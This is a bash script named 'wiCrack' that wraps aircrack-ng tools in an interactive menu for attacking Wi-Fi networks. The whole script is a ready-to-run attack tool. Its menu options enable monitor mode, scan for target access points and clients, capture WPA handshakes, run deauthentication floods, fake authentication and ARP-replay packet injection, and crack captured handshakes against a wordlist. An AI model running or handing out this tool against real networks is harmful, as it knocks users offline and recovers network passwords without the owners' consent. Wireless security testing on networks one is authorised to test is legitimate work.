#!/bin/bash


sleep 4
function loop(){
	i=1
	for i in 1
	do
		banner
	done
}
echo -e "\033[0;36mStarting wiCrack\033[0m"
clear
sleep 2
ifconfig -s
echo
echo -e "\033[1;31mChoose Wifi Interface : \e[0m\c"
read iface
sleep 1
function banner() {
clear
echo "       _  ______                  _     ";
echo "      (_)/ _____)                | |    ";
echo " _ _ _ _| /       ____ ____  ____| |  _ ";
echo "| | | | | |      / ___) _  |/ ___) | / )";
echo "| | | | | \_____| |  ( ( | ( (___| |< ( ";
echo " \____|_|\______)_|   \_||_|\____)_| \_)";
echo "                                        ";
echo -e "\033[1;32m
[1]Monitor Mod
[2]Network Recon
[3]Client Recon
[4]Capture Handshake
[5]Deauth Attack
[6]FakeAuth Attack
[7]Packet İnjection
[8]Wifi Crack
[0]Restore Default
(CTRL+C TO EXIT)
#~: \033[0m\c
"
read slc
clear
case $slc in

	0)
	sleep 2
	airmon-ng stop $iface2 2&>/dev/null
	sleep 3
	airmon-ng check kill 2&>/dev/null
	sleep 2
	systemctl restart NetworkManager 2&>/dev/null
	sleep 1
	service networking restart
	;;

	1)
		echo -e "\033[1;34mStarting Monitor Mod\033[0m"
		airmon-ng check kill 2&>/dev/null
		sleep 1
		airmon-ng start $iface 2&>/dev/null
		sleep 1
		clear
		ifconfig -s
		echo
		echo -e "\033[1;33mChoose Monitor Mod Interface : \e[0m\c"
		read iface2
		loop
	;;

	2)
	echo
	echo -e "\033[1;35mStarting Network Recon...\033[0m"
	sleep 2
	airodump-ng $iface2
	echo "Stopped in Network Recon"
	echo -e "\033[1;32mTarget AP Mac : \033[0m\c"
	read tap
	echo -e "\033[1;32mTarget AP Channel : \033[0m\c"
	read tch
	loop
	;;
	
	
	3)
	clear
	sleep 1
	echo
	echo -e "\033[1;35mStarting Client Recon in Target AP\033[0m"
	airodump-ng --bssid $tap --channel $tch $iface2
	echo -e "\033[1;32mTarget Client Mac : \033[0m\c"
	read clnt
	loop
	;;

	4)
	clear
	sleep 1
	echo
	echo -e "\033[1;33mEnter the save path to handshake : \033[0m\c"
	read pt
	xterm -e "airodump-ng --bssid $tap --channel $tch -w $pt $iface2"  &
		echo -e "[0 = Menü] : \c"
		read ff
		case $ff in 
			0)
			banner
			;;

			*)
			echo "Bad number"
			banner
			;;
		esac
	;;

	5)
	clear
	sleep 1
	echo -e "Enter the deauth packages amount : \c"
	read pac
	echo
	echo -e "Select Deauth Mode
	[1] = All Network
	[2] = Client"
	read sd
		if [ $sd -eq 1 ];
		then
			xterm -e "aireplay-ng --deauth $pac -a $tap $iface2"
		elif [ $sd -eq 2 ];
		then
			xterm -e "aireplay-ng --deauth $pac -a $tap -c $clnt $iface2" &
		fi
		echo -e "[0 = Menü] : \c"
		read ff
		case $ff in 
			0)
			banner
			;;

			*)
			echo "Bad number"
			banner
			;;
		esac
		;;

	6)
	clear
	echo
	sleep 1
	echo -e "Please enter the count for fakeauth"
	read con
	ip link show $iface2
	echo -e "\033[1;33mEnter the iface mac address : \033[0m\c"
	read macadr
	xterm -e "aireplay-ng --fakeauth $con -a $tap -h $macadr $iface2" &
	echo -e "[0 = Menü] : \c"
		read ff
		case $ff in 
			0)
			banner
			;;

			*)
			echo "Bad number"
			banner
			;;
		esac
	;;

	7)
	clear
	echo "\033[1;33mEnter the save path : \033[0m\c"
	read pachand
	echo "\033[1;35mStarting arp packet injection\033[0m"
	sleep 1
	xterm -e "aireplay-ng -3 -b $tap -h $macadr -r $pachand $iface2" &
	echo -e "[0 = Menü] : \c"
	read ff
	case $ff in 
			0)
			banner
			;;

			*)
			echo "Bad number"
			banner
			;;
		esac
	;;

	8)
	clear
	echo -e "please enter the handshake path : \c"
	read hand
	echo
	echo -e "Enter the wordlist : \c"
	read ws
	echo -e "Starting wifi_cracker"
	sleep 2
	aircrack-ng $hand -w $ws $iface2 &
	echo -e "[0 = Menü] : \c"
	read ff
	case $ff in 
			0)
			banner
			;;

			*)
			echo "Bad number"
			banner
			;;
		esac
	;;

	*)
	echo "Bad number please try again !!"
	echo -e "[0 = Menü] : \c"
		read ff
		case $ff in 
			0)
			banner
			;;

			*)
			echo "Bad number"
			banner
			;;
		esac
	;;
esac
}
banner
loop


